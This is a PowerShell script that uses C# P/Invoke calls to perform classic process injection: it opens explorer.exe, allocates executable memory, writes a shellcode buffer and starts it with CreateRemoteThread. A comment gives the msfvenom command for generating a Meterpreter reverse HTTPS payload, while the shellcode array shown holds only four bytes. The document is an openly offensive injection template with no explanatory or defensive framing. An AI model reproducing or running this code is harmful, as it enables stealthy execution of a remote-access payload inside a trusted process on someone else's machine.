Function Standard_Process_Injection {

$Kernel32 = @'

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class Kernel32 {

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
        uint processAccess,
        bool bInheritHandle,
        uint processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocEx(
        IntPtr hProcess,
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        [Out] byte[] lpBuffer,
        int dwSize,
        out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        Int32 nSize,
        out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(
        IntPtr hProcess,
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        IntPtr lpThreadId);
}

'@

Add-Type $Kernel32

# Get the process ID of explorer
$Process = (Get-Process -Name "explorer").Id

# Open a handle to the process
[IntPtr]$hProcess = [Kernel32]::OpenProcess(0x001F0FFF, $false, [uint32]$Process)

# Allocate memory in the remote process
$addr = [Kernel32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, 0x1000, 0x3000, 0x40)

# msfvenom.bat -p windows/x64/meterpreter/reverse_https LHOST=127.0.0.1 LPORT=7710 -f powershell EXITFUNC=thread
[Byte[]] $buf = 0xfc,0x48,0x83,0xe4
$size = $buf.Length

# Write shellcode to the allocated memory
$outsize = [IntPtr]::Zero
[Kernel32]::WriteProcessMemory($hProcess, $addr, $buf, $size, [ref] $outsize) > $null

# Create a remote thread to execute the shellcode
[IntPtr]$hThread = [Kernel32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)

}

Standard_Process_Injection
